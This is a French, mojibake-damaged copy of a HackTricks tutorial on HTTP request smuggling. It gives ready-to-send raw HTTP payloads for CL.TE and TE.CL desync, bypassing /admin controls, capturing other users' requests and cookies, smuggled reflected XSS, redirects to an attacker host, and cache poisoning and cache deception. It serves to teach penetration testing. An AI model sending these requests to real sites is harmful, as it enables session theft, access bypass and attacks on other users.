# Attaque de Demande HTTP Smuggling / DÃ©synchronisation HTTP

<details>

<summary><strong>Apprenez le piratage AWS de zÃ©ro Ã  hÃ©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en Ã©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres faÃ§ons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ou **tÃ©lÃ©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* DÃ©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dÃ©pÃ´ts GitHub.

</details>

## Qu'est-ce que c'est

Cette vulnÃ©rabilitÃ© se produit lorsqu'une **dÃ©synchronisation** entre les **proxys frontaux** et le **serveur back-end** permet Ã  un **attaquant** d'**envoyer** une **demande HTTP** qui sera **interprÃ©tÃ©e** comme une **seule demande** par les **proxys frontaux** (Ã©quilibrage de charge/proxy inverse) et **comme 2 demandes** par le **serveur back-end**.\
Cela permet Ã  un utilisateur de **modifier la prochaine demande qui arrive au serveur back-end aprÃ¨s la sienne**.

### ThÃ©orie

[**SpÃ©cification RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si un message est reÃ§u avec Ã  la fois un champ d'en-tÃªte Transfer-Encoding et un champ d'en-tÃªte Content-Length, ce dernier DOIT Ãªtre ignorÃ©.

**Content-Length**

> L'en-tÃªte d'entitÃ© Content-Length indique la taille du corps de l'entitÃ©, en octets, envoyÃ© au destinataire.

**Transfer-Encoding: chunked**

> L'en-tÃªte Transfer-Encoding spÃ©cifie la forme de codage utilisÃ©e pour transfÃ©rer en toute sÃ©curitÃ© le corps de la charge utile Ã  l'utilisateur.\
> Chunked signifie que de grandes donnÃ©es sont envoyÃ©es sous forme de sÃ©ries de morceaux.

### RÃ©alitÃ©

Le **Front-End** (un Ã©quilibreur de charge / Proxy Inverse) **traite** l'en-tÃªte _**content-length**_ ou l'en-tÃªte _**transfer-encoding**_ et le **serveur Back-End** **traite l'autre** provoquant une **dÃ©synchronisation** entre les 2 systÃ¨mes.\
Cela pourrait Ãªtre trÃ¨s critique car **un attaquant pourra envoyer une demande** au proxy inverse qui sera **interprÃ©tÃ©e** par le **serveur back-end comme 2 demandes diffÃ©rentes**. Le **danger** de cette technique rÃ©side dans le fait que le **serveur back-end interprÃ©tera la 2Ã¨me demande injectÃ©e** comme si elle **venait du prochain client** et la **vraie demande** de ce client fera **partie** de la **demande injectÃ©e**.

### ParticularitÃ©s

Rappelez-vous qu'en HTTP **un caractÃ¨re de nouvelle ligne est composÃ© de 2 octets :**

* **Content-Length** : Cet en-tÃªte utilise un **nombre dÃ©cimal** pour indiquer le **nombre d'octets** du **corps** de la demande. Le corps est censÃ© se terminer par le dernier caractÃ¨re, **une nouvelle ligne n'est pas nÃ©cessaire Ã  la fin de la demande**.
* **Transfer-Encoding** : Cet en-tÃªte utilise dans le **corps** un **nombre hexadÃ©cimal** pour indiquer le **nombre d'octets** du **prochain morceau**. Le **morceau** doit se **terminer** par une **nouvelle ligne** mais cette nouvelle ligne **n'est pas comptÃ©e** par l'indicateur de longueur. Cette mÃ©thode de transfert doit se terminer par un **morceau de taille 0 suivi de 2 nouvelles lignes** : `0`
* **Connection** : D'aprÃ¨s mon expÃ©rience, il est recommandÃ© d'utiliser **`Connection: keep-alive`** sur la premiÃ¨re demande de la demande de Smuggling.

## Exemples de Base

Les attaques de demande HTTP smuggling sont Ã©laborÃ©es en envoyant des demandes ambiguÃ«s qui exploitent les divergences dans la faÃ§on dont les serveurs frontaux et back-end interprÃ¨tent les en-tÃªtes `Content-Length` (CL) et `Transfer-Encoding` (TE). Ces attaques peuvent se manifester sous diffÃ©rentes formes, principalement sous forme de **CL.TE**, **TE.CL** et **TE.TE**. Chaque type reprÃ©sente une combinaison unique de la priorisation de ces en-tÃªtes par les serveurs frontaux et back-end. Les vulnÃ©rabilitÃ©s dÃ©coulent du traitement de la mÃªme demande par les serveurs de diffÃ©rentes maniÃ¨res, entraÃ®nant des rÃ©sultats inattendus et potentiellement malveillants.

### Exemples de Types de VulnÃ©rabilitÃ©s de Base

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### VulnÃ©rabilitÃ© CL.TE (Content-Length utilisÃ© par le Front-End, Transfer-Encoding utilisÃ© par le Back-End)
- **Front-End (CL) :** Traite la demande en fonction de l'en-tÃªte `Content-Length`.
- **Back-End (TE) :** Traite la demande en fonction de l'en-tÃªte `Transfer-Encoding`.
- **ScÃ©nario d'attaque :**
- L'attaquant envoie une demande oÃ¹ la valeur de l'en-tÃªte `Content-Length` ne correspond pas Ã  la longueur rÃ©elle du contenu.
- Le serveur front-end transmet la demande entiÃ¨re au back-end, en fonction de la valeur de `Content-Length`.
- Le serveur back-end traite la demande par morceaux en raison de l'en-tÃªte `Transfer-Encoding: chunked`, interprÃ©tant les donnÃ©es restantes comme une demande sÃ©parÃ©e et ultÃ©rieure.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### VulnÃ©rabilitÃ© TE.CL (Transfer-Encoding utilisÃ© par le Front-End, Content-Length utilisÃ© par le Back-End)
- **Front-End (TE) :** Traite la demande en fonction de l'en-tÃªte `Transfer-Encoding`.
- **Back-End (CL) :** Traite la demande en fonction de l'en-tÃªte `Content-Length`.
- **ScÃ©nario d'attaque :**
- L'attaquant envoie une demande fragmentÃ©e oÃ¹ la taille du fragment (`7b`) et la longueur rÃ©elle du contenu (`Content-Length: 4`) ne correspondent pas.
- Le serveur front-end, respectant `Transfer-Encoding`, transmet la demande entiÃ¨re au back-end.
- Le serveur back-end, respectant `Content-Length`, traite uniquement la partie initiale de la demande (`7b` octets), laissant le reste comme partie d'une demande ultÃ©rieure non intentionnelle.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### VulnÃ©rabilitÃ© TE.TE (Transfer-Encoding utilisÃ© par les deux, avec obfuscation)
- **Serveurs :** Les deux prennent en charge `Transfer-Encoding`, mais l'un peut Ãªtre trompÃ© pour l'ignorer via l'obfuscation.
- **ScÃ©nario d'attaque :**
- L'attaquant envoie une demande avec des en-tÃªtes `Transfer-Encoding` obfusquÃ©s.
- Selon le serveur (front-end ou back-end) qui ne parvient pas Ã  reconnaÃ®tre l'obfuscation, une vulnÃ©rabilitÃ© CL.TE ou TE.CL peut Ãªtre exploitÃ©e.
- La partie non traitÃ©e de la demande, telle que vue par l'un des serveurs, devient une partie d'une demande ultÃ©rieure, conduisant Ã  un smuggling.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **ScÃ©nario CL.CL (Content-Length utilisÃ© par les deux Front-End et Back-End) :**
- Les deux serveurs traitent la demande uniquement en fonction de l'en-tÃªte `Content-Length`.
- Ce scÃ©nario ne conduit gÃ©nÃ©ralement pas Ã  un smuggling, car il y a une concordance dans la faÃ§on dont les deux serveurs interprÃ¨tent la longueur de la demande.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Demande normale
```

#### **ScÃ©nario CL != 0 :**
- Fait rÃ©fÃ©rence aux scÃ©narios oÃ¹ l'en-tÃªte `Content-Length` est prÃ©sent et a une valeur autre que zÃ©ro, indiquant que le corps de la demande contient du contenu.
- Il est crucial pour comprendre et Ã©laborer des attaques de smuggling, car il influence la faÃ§on dont les serveurs dÃ©terminent la fin d'une demande.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Corps non vide
```

#### Forcer via les en-tÃªtes hop-by-hop

En abusant des en-tÃªtes hop-by-hop, vous pourriez indiquer au proxy de **supprimer l'en-tÃªte Content-Length ou Transfer-Encoding pour permettre un abus de demande HTTP smuggling**.
```
Connection: Content-Length
```
Pour **plus d'informations sur les en-tÃªtes hop-by-hop**, visitez :

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## Identification de la faille de requÃªte HTTP Smuggling

L'identification des vulnÃ©rabilitÃ©s de requÃªte HTTP smuggling peut souvent Ãªtre rÃ©alisÃ©e en utilisant des techniques de synchronisation, qui reposent sur l'observation du temps nÃ©cessaire au serveur pour rÃ©pondre aux requÃªtes manipulÃ©es. Ces techniques sont particuliÃ¨rement utiles pour dÃ©tecter les vulnÃ©rabilitÃ©s CL.TE et TE.CL. Outre ces mÃ©thodes, il existe d'autres stratÃ©gies et outils qui peuvent Ãªtre utilisÃ©s pour trouver de telles vulnÃ©rabilitÃ©s :

### Recherche de vulnÃ©rabilitÃ©s CL.TE en utilisant des techniques de synchronisation
- **MÃ©thode :**
- Envoyer une requÃªte qui, si l'application est vulnÃ©rable, amÃ¨nera le serveur back-end Ã  attendre des donnÃ©es supplÃ©mentaires.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **Observation :**
- Le serveur frontal traite la requÃªte en fonction de `Content-Length` et coupe le message prÃ©maturÃ©ment.
- Le serveur back-end, s'attendant Ã  un message chunked, attend le prochain chunk qui n'arrive jamais, provoquant un retard.

- **Indicateurs :**
- DÃ©lais d'attente ou longs retards dans la rÃ©ponse.
- RÃ©ception d'une erreur 400 Bad Request du serveur back-end, parfois avec des informations dÃ©taillÃ©es sur le serveur.

### Recherche de vulnÃ©rabilitÃ©s TE.CL en utilisant des techniques de synchronisation
- **MÃ©thode :**
- Envoyer une requÃªte qui, si l'application est vulnÃ©rable, amÃ¨nera le serveur back-end Ã  attendre des donnÃ©es supplÃ©mentaires.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **Observation :**
- Le serveur frontal traite la requÃªte en fonction de `Transfer-Encoding` et transmet l'intÃ©gralitÃ© du message.
- Le serveur back-end, s'attendant Ã  un message basÃ© sur `Content-Length`, attend des donnÃ©es supplÃ©mentaires qui n'arrivent jamais, provoquant un retard.

### Autres mÃ©thodes pour trouver des vulnÃ©rabilitÃ©s
- **Analyse de rÃ©ponse diffÃ©rentielle :**
- Envoyer des versions lÃ©gÃ¨rement variÃ©es d'une requÃªte et observer si les rÃ©ponses du serveur diffÃ¨rent de maniÃ¨re inattendue, indiquant une divergence d'analyse.

- **Utilisation d'outils automatisÃ©s :**
- Des outils comme l'extension 'HTTP Request Smuggler' de Burp Suite peuvent tester automatiquement ces vulnÃ©rabilitÃ©s en envoyant diverses formes de requÃªtes ambiguÃ«s et en analysant les rÃ©ponses.

- **Tests de variance de Content-Length :**
- Envoyer des requÃªtes avec des valeurs de `Content-Length` variables qui ne correspondent pas Ã  la longueur rÃ©elle du contenu et observer comment le serveur gÃ¨re de telles incohÃ©rences.

- **Tests de variance de Transfer-Encoding :**
- Envoyer des requÃªtes avec des en-tÃªtes `Transfer-Encoding` obfusquÃ©s ou malformÃ©s et surveiller comment les serveurs frontal et back-end rÃ©agissent diffÃ©remment Ã  de telles manipulations.


### Test de vulnÃ©rabilitÃ© de la requÃªte HTTP Smuggling

AprÃ¨s avoir confirmÃ© l'efficacitÃ© des techniques de synchronisation, il est crucial de vÃ©rifier si les requÃªtes des clients peuvent Ãªtre manipulÃ©es. Une mÃ©thode simple consiste Ã  tenter de falsifier vos requÃªtes, par exemple, faire en sorte qu'une requÃªte vers `/` renvoie une rÃ©ponse 404. Les exemples `CL.TE` et `TE.CL` discutÃ©s prÃ©cÃ©demment dans [Exemples de base](./#basic-examples) montrent comment falsifier une requÃªte client pour obtenir une rÃ©ponse 404, malgrÃ© le fait que le client cherche Ã  accÃ©der Ã  une ressource diffÃ©rente.

**ConsidÃ©rations clÃ©s**

Lors du test des vulnÃ©rabilitÃ©s de la requÃªte smuggling en interfÃ©rant avec d'autres requÃªtes, gardez Ã  l'esprit :

* **Connexions rÃ©seau distinctes :** Les requÃªtes "d'attaque" et "normales" doivent Ãªtre envoyÃ©es sur des connexions rÃ©seau distinctes. Utiliser la mÃªme connexion pour les deux ne valide pas la prÃ©sence de la vulnÃ©rabilitÃ©.
* **URL et paramÃ¨tres cohÃ©rents :** Essayez d'utiliser des URL et des noms de paramÃ¨tres identiques pour les deux requÃªtes. Les applications modernes routent souvent les requÃªtes vers des serveurs back-end spÃ©cifiques en fonction de l'URL et des paramÃ¨tres. En les faisant correspondre, vous augmentez la probabilitÃ© que les deux requÃªtes soient traitÃ©es par le mÃªme serveur, une condition prÃ©alable Ã  une attaque rÃ©ussie.
* **Synchronisation et conditions de course :** La requÃªte "normale", destinÃ©e Ã  dÃ©tecter l'interfÃ©rence de la requÃªte "d'attaque", entre en concurrence avec d'autres requÃªtes d'application concurrentes. Par consÃ©quent, envoyez la requÃªte "normale" immÃ©diatement aprÃ¨s la requÃªte "d'attaque". Les applications chargÃ©es peuvent nÃ©cessiter plusieurs essais pour confirmer de maniÃ¨re concluante la vulnÃ©rabilitÃ©.
* **DÃ©fis de l'Ã©quilibrage de charge :** Les serveurs frontal agissant comme Ã©quilibreurs de charge peuvent distribuer les requÃªtes sur divers systÃ¨mes back-end. Si les requÃªtes "d'attaque" et "normales" se retrouvent sur des systÃ¨mes diffÃ©rents, l'attaque Ã©chouera. Cet aspect de l'Ã©quilibrage de charge peut nÃ©cessiter plusieurs tentatives pour confirmer une vulnÃ©rabilitÃ©.
* **Impact utilisateur non intentionnel :** Si votre attaque affecte involontairement une autre requÃªte utilisateur (pas la requÃªte "normale" que vous avez envoyÃ©e pour la dÃ©tection), cela indique que votre attaque a influencÃ© un autre utilisateur de l'application. Des tests continus pourraient perturber d'autres utilisateurs, exigeant une approche prudente.


## Abus de la requÃªte HTTP Smuggling

### Contourner les contrÃ´les de sÃ©curitÃ© frontal

### Contournement de la sÃ©curitÃ© frontale via la requÃªte HTTP Smuggling

Parfois, les proxies frontal imposent des mesures de sÃ©curitÃ©, scrutant les requÃªtes entrantes. Cependant, ces mesures peuvent Ãªtre contournÃ©es en exploitant la requÃªte HTTP Smuggling, permettant un accÃ¨s non autorisÃ© aux points de terminaison restreints. Par exemple, l'accÃ¨s Ã  `/admin` peut Ãªtre interdit de l'extÃ©rieur, le proxy frontal bloquant activement de telles tentatives. NÃ©anmoins, ce proxy peut nÃ©gliger d'inspecter les requÃªtes intÃ©grÃ©es dans une requÃªte HTTP smugglÃ©e, laissant une faille pour contourner ces restrictions.

ConsidÃ©rez les exemples suivants illustrant comment la requÃªte HTTP Smuggling peut Ãªtre utilisÃ©e pour contourner les contrÃ´les de sÃ©curitÃ© frontal, ciblant spÃ©cifiquement le chemin `/admin` qui est gÃ©nÃ©ralement protÃ©gÃ© par le proxy frontal :

**Exemple CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Dans l'attaque CL.TE, l'en-tÃªte `Content-Length` est utilisÃ© pour la requÃªte initiale, tandis que la requÃªte intÃ©grÃ©e ultÃ©rieure utilise l'en-tÃªte `Transfer-Encoding: chunked`. Le proxy frontal traite la requÃªte `POST` initiale mais ne parvient pas Ã  inspecter la requÃªte `GET /admin` intÃ©grÃ©e, permettant un accÃ¨s non autorisÃ© au chemin `/admin`.

**Exemple TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Inversement, dans l'attaque TE.CL, la requÃªte `POST` initiale utilise `Transfer-Encoding: chunked`, et la requÃªte imbriquÃ©e ultÃ©rieure est traitÃ©e en fonction de l'en-tÃªte `Content-Length`. Similaire Ã  l'attaque CL.TE, le proxy frontal ignore la requÃªte `GET /admin` dissimulÃ©e, accordant involontairement l'accÃ¨s au chemin `/admin` restreint.

### RÃ©vÃ©ler la rÃ©Ã©criture de requÃªte frontale <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Les applications utilisent souvent un **serveur frontal** pour modifier les requÃªtes entrantes avant de les transmettre au serveur back-end. Une modification typique implique l'ajout d'en-tÃªtes, tels que `X-Forwarded-For: <IP du client>`, pour transmettre l'IP du client au back-end. Comprendre ces modifications peut Ãªtre crucial, car cela pourrait rÃ©vÃ©ler des moyens de **contourner les protections** ou de **dÃ©couvrir des informations ou des points de terminaison dissimulÃ©s**.

Pour enquÃªter sur la maniÃ¨re dont un proxy modifie une requÃªte, localisez un paramÃ¨tre POST que le back-end renvoie dans la rÃ©ponse. Ensuite, crÃ©ez une requÃªte, en utilisant ce paramÃ¨tre en dernier, similaire Ã  ce qui suit:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Dans cette structure, les composants de requÃªte suivants sont ajoutÃ©s aprÃ¨s `search=`, qui est le paramÃ¨tre reflÃ©tÃ© dans la rÃ©ponse. Cette rÃ©flexion exposera les en-tÃªtes de la requÃªte suivante.

Il est important d'aligner l'en-tÃªte `Content-Length` de la requÃªte imbriquÃ©e avec la longueur rÃ©elle du contenu. Il est conseillÃ© de commencer par une petite valeur et d'augmenter progressivement, car une valeur trop basse tronquera les donnÃ©es reflÃ©tÃ©es, tandis qu'une valeur trop Ã©levÃ©e peut provoquer une erreur de requÃªte.

Cette technique est Ã©galement applicable dans le contexte d'une vulnÃ©rabilitÃ© TE.CL, mais la requÃªte doit se terminer par `search=\r\n0`. Peu importe les caractÃ¨res de saut de ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.

Cette mÃ©thode sert principalement Ã  comprendre les modifications de requÃªte effectuÃ©es par le proxy frontal, rÃ©alisant essentiellement une enquÃªte auto-dirigÃ©e.

### Capture des requÃªtes d'autres utilisateurs <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Il est possible de capturer les requÃªtes de l'utilisateur suivant en ajoutant une requÃªte spÃ©cifique en tant que valeur d'un paramÃ¨tre lors d'une opÃ©ration POST. Voici comment cela peut Ãªtre accompli :

En ajoutant la requÃªte suivante en tant que valeur d'un paramÃ¨tre, vous pouvez enregistrer la requÃªte du client suivant :
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Dans ce scÃ©nario, le **paramÃ¨tre de commentaire** est destinÃ© Ã  stocker le contenu dans la section commentaire d'un article sur une page publiquement accessible. Par consÃ©quent, le contenu de la requÃªte suivante apparaÃ®tra comme un commentaire.

Cependant, cette technique prÃ©sente des limitations. En gÃ©nÃ©ral, elle ne capture que les donnÃ©es jusqu'au dÃ©limiteur de paramÃ¨tre utilisÃ© dans la requÃªte trafiquÃ©e. Pour les soumissions de formulaires encodÃ©es en URL, ce dÃ©limiteur est le caractÃ¨re `&`. Cela signifie que le contenu capturÃ© de la requÃªte de l'utilisateur victime s'arrÃªtera au premier `&`, qui peut mÃªme faire partie de la chaÃ®ne de requÃªte.

De plus, il convient de noter que cette approche est Ã©galement viable avec une vulnÃ©rabilitÃ© TE.CL. Dans de tels cas, la requÃªte devrait se terminer par `search=\r\n0`. Peu importe les caractÃ¨res de nouvelle ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.

### Utilisation du trafic de requÃªtes HTTP pour exploiter les XSS rÃ©flÃ©chis

Le trafic de requÃªtes HTTP peut Ãªtre utilisÃ© pour exploiter les pages web vulnÃ©rables aux **XSS rÃ©flÃ©chis**, offrant des avantages significatifs :

* L'interaction avec les utilisateurs cibles n'est **pas nÃ©cessaire**.
* Permet l'exploitation de XSS dans des parties de la requÃªte normalement **inaccessibles**, comme les en-tÃªtes de requÃªte HTTP.

Dans les scÃ©narios oÃ¹ un site web est vulnÃ©rable aux XSS rÃ©flÃ©chis via l'en-tÃªte User-Agent, la charge utile suivante dÃ©montre comment exploiter cette vulnÃ©rabilitÃ© :
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ce payload est structurÃ© pour exploiter la vulnÃ©rabilitÃ© en :

1. Initiating une requÃªte `POST`, apparemment typique, avec un en-tÃªte `Transfer-Encoding: chunked` pour indiquer le dÃ©but du smuggling.
2. EnchaÃ®nant avec un `0`, marquant la fin du corps du message chunked.
3. Ensuite, une requÃªte `GET` smugglÃ©e est introduite, oÃ¹ l'en-tÃªte `User-Agent` est injectÃ© avec un script, `<script>alert(1)</script>`, dÃ©clenchant le XSS lorsque le serveur traite cette requÃªte ultÃ©rieure.

En manipulant l'en-tÃªte `User-Agent` via le smuggling, le payload contourne les contraintes normales de la requÃªte, exploitant ainsi la vulnÃ©rabilitÃ© XSS rÃ©flÃ©chie d'une maniÃ¨re non standard mais efficace.

### Utilisation du smuggling de requÃªte HTTP pour transformer une redirection sur site en une redirection ouverte <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Exploitation des redirections sur site avec le smuggling de requÃªte HTTP <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Les applications redirigent souvent d'une URL Ã  une autre en utilisant le nom d'hÃ´te de l'en-tÃªte `Host` dans l'URL de redirection. C'est courant avec des serveurs web comme Apache et IIS. Par exemple, demander un dossier sans barre oblique finale entraÃ®ne une redirection pour inclure la barre oblique :
```
GET /home HTTP/1.1
Host: normal-website.com
```
RÃ©sultats :
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Bien que semblant inoffensif, ce comportement peut Ãªtre manipulÃ© en utilisant le trafic HTTP pour rediriger les utilisateurs vers un site externe. Par exemple:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Cette requÃªte dissimulÃ©e pourrait entraÃ®ner la redirection de la prochaine requÃªte utilisateur traitÃ©e vers un site web contrÃ´lÃ© par un attaquant :
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
RÃ©sultats en :
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### Utilisation du dÃ©tournement de requÃªte HTTP pour effectuer un empoisonnement de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### Exploitation de l'empoisonnement de cache web via le dÃ©tournement de requÃªte HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

L'empoisonnement de cache web peut Ãªtre exÃ©cutÃ© si un composant de l'**infrastructure frontale met en cache le contenu**, gÃ©nÃ©ralement pour amÃ©liorer les performances. En manipulant la rÃ©ponse du serveur, il est possible de **empoisonner le cache**.

PrÃ©cÃ©demment, nous avons observÃ© comment les rÃ©ponses du serveur pouvaient Ãªtre modifiÃ©es pour renvoyer une erreur 404 (voir [Exemples de base](./#basic-examples)). De la mÃªme maniÃ¨re, il est possible de tromper le serveur pour qu'il renvoie le contenu de `/index.html` en rÃ©ponse Ã  une demande de `/static/include.js`. Par consÃ©quent, le contenu de `/static/include.js` est remplacÃ© dans le cache par celui de `/index.html`, rendant `/static/include.js` inaccessible aux utilisateurs, ce qui peut potentiellement entraÃ®ner un DÃ©ni de Service (DoS).

Cette technique devient particuliÃ¨rement puissante si une **vulnÃ©rabilitÃ© de redirection ouverte** est dÃ©couverte ou s'il y a une **redirection sur site vers une redirection ouverte**. Ces vulnÃ©rabilitÃ©s peuvent Ãªtre exploitÃ©es pour remplacer le contenu mis en cache de `/static/include.js` par un script sous le contrÃ´le de l'attaquant, permettant essentiellement une attaque gÃ©nÃ©ralisÃ©e de Cross-Site Scripting (XSS) contre tous les clients demandant le `/static/include.js` mis Ã  jour.

Voici une illustration de l'exploitation de **l'empoisonnement de cache combinÃ© Ã  une redirection sur site vers une redirection ouverte**. L'objectif est de modifier le contenu mis en cache de `/static/include.js` pour servir du code JavaScript contrÃ´lÃ© par l'attaquant:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Notez la requÃªte intÃ©grÃ©e ciblant `/post/next?postId=3`. Cette requÃªte sera redirigÃ©e vers `/post?postId=4`, en utilisant la **valeur de l'en-tÃªte Host** pour dÃ©terminer le domaine. En modifiant l'en-tÃªte **Host**, l'attaquant peut rediriger la requÃªte vers son domaine (**redirection sur site vers une redirection ouverte**).

AprÃ¨s un **empoisonnement de socket** rÃ©ussi, une requÃªte **GET** pour `/static/include.js` doit Ãªtre initiÃ©e. Cette requÃªte sera contaminÃ©e par la prÃ©cÃ©dente requÃªte de **redirection sur site vers une redirection ouverte** et rÃ©cupÃ©rera le contenu du script contrÃ´lÃ© par l'attaquant.

Par la suite, toute requÃªte pour `/static/include.js` servira le contenu mis en cache du script de l'attaquant, lanÃ§ant ainsi efficacement une vaste attaque XSS.


### Utilisation du dÃ©tournement de requÃªte HTTP pour effectuer une tromperie de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Quelle est la diffÃ©rence entre l'empoisonnement de cache web et la tromperie de cache web ?**
>
> * Dans l'**empoisonnement de cache web**, l'attaquant amÃ¨ne l'application Ã  stocker un contenu malveillant dans le cache, et ce contenu est servi Ã  partir du cache Ã  d'autres utilisateurs de l'application.
> * Dans la **tromperie de cache web**, l'attaquant amÃ¨ne l'application Ã  stocker un contenu sensible appartenant Ã  un autre utilisateur dans le cache, puis l'attaquant rÃ©cupÃ¨re ce contenu Ã  partir du cache.

L'attaquant crÃ©e une requÃªte dissimulÃ©e qui rÃ©cupÃ¨re un contenu sensible spÃ©cifique Ã  l'utilisateur. ConsidÃ©rez l'exemple suivant:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Si cette requÃªte de contrebande empoisonne une entrÃ©e de cache destinÃ©e Ã  un contenu statique (par exemple, `/someimage.png`), les donnÃ©es sensibles de la victime provenant de `/private/messages` pourraient Ãªtre mises en cache sous l'entrÃ©e de cache du contenu statique. Par consÃ©quent, l'attaquant pourrait potentiellement rÃ©cupÃ©rer ces donnÃ©es sensibles mises en cache.

### Armes HTTP Request Smuggling avec la dÃ©synchronisation des rÃ©ponses HTTP

